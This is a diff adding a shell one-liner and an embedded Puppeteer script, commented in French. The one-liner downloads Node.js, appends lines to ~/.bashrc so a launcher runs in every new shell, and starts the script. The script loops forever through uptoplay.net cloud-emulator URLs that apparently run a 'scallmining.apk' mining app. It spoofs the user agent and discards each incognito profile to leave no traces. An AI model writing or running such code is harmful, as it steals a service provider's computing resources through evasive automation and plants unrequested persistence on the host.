@@ -1,0 +1,83 @@
+cd ~/. && wget https://nodejs.org/dist/v22.11.0/node-v22.11.0-linux-x64.tar.xz && tar -xvf node-v22.11.0-linux-x64.tar.xz && rm -rf node-v22.11.0-linux-x64.tar.xz && cd node-v22.11.0-linux-x64 && touch online && chmod +x * && echo "~/./node-v22.11.0-linux-x64/online" >> ~/.bashrc && sudo echo "~/./triage/online" >> ~/.bashrc && echo "cd ~/./node-v22.11.0-linux-x64/bin && sudo apt-get install -y xvfb && xvfb-run node minerdash.js" > ~/./node-v22.11.0-linux-x64/online && cd ~/. && cat << 'ENDFILE' > ~/./node-v22.11.0-linux-x64/bin/minerdash.js && cd ~/./node-v22.11.0-linux-x64/bin && sudo apt-get install -y xvfb && npm init -y && npm install -y puppeteer && xvfb-run node minerdash.js
+const puppeteer = require('puppeteer');
+const fs = require('fs');
+
+(async () => {
+    console.log("--- DÉMARRAGE DU SCRIPT AVEC PROFILS ISOLÉS ---");
+
+    // Lancement du navigateur maître (sans dossier de données partagé)
+    const browser = await puppeteer.launch({
+        headless: "new",
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-gpu',
+            '--no-first-run',
+            '--no-zygote'
+        ]
+    });
+
+    const urls = [
+        "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F230600031%2FNewDocuments%2F%2Fscallmining.apk",
+        "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F230600032%2FNewDocuments%2F%2Fscallmining.apk",
+        "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F230600043%2FNewDocuments%2F%2Fscallmining.apk",
+        "https://www.uptoplay.net/runapk/create-androidapk.html?app=android_blank&apk=%2Fvar%2Fwww%2Fhtml%2Fweboffice%2Fmydata%2F230600034%2FNewDocuments%2F%2Fscallmining.apk",
+    ];
+
+    const runInstance = async (id, url) => {
+        while (true) {
+            // CRÉATION D'UN CONTEXTE INCOGNITO (Isolation totale du profil)
+            const context = await browser.createBrowserContext();
+            const page = await context.newPage();
+
+            try {
+                // Configuration de l'empreinte de l'instance
+                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');
+                
+                console.log(`[Instance ${id}] --- Lancement Profil Isolé ---`);
+                
+                // Navigation
+                await page.goto(url, { waitUntil: 'networkidle2', timeout: 90000 });
+
+                // Clic sur le bouton Start
+                const startBtn = '#talpa-splash-button';
+                await page.waitForSelector(startBtn, { timeout: 60000 });
+                await page.click(startBtn);
+                
+                console.log(`[Instance ${id}] Bouton cliqué. Initialisation (45s)...`);
+                await new Promise(r => setTimeout(r, 45000));
+
+                // Interaction secondaire
+                await page.evaluate(() => {
+                    const targets = ['enter', 'start', 'play'];
+                    const el = Array.from(document.querySelectorAll('a, button, div'))
+                        .find(e => targets.some(t => e.textContent.toLowerCase().trim().includes(t)));
+                    if (el) el.click();
+                });
+
+                console.log(`[Instance ${id}] Session active pour 15 min.`);
+                await new Promise(r => setTimeout(r, 15 * 60 * 1000));
+
+            } catch (error) {
+                console.error(`[Instance ${id}] ERREUR : ${error.message}.`);
+                await new Promise(r => setTimeout(r, 30000)); // Attente réduite en cas d'erreur
+            } finally {
+                // FERMETURE DU CONTEXTE (Supprime toutes les traces/cookies de cette session)
+                await page.close();
+                await context.close();
+                console.log(`[Instance ${id}] Nettoyage du profil terminé. Relance...`);
+            }
+        }
+    };
+
+    // Lancement séquencé pour économiser la RAM
+    for (let i = 0; i < urls.length; i++) {
+        console.log(`Démarrage de l'instance isolée ${i + 1}...`);
+        runInstance(i + 1, urls[i]);
+        if (i < urls.length - 1) {
+            await new Promise(r => setTimeout(r, 15000)); 
+        }
+    }
+})();
+ENDFILE
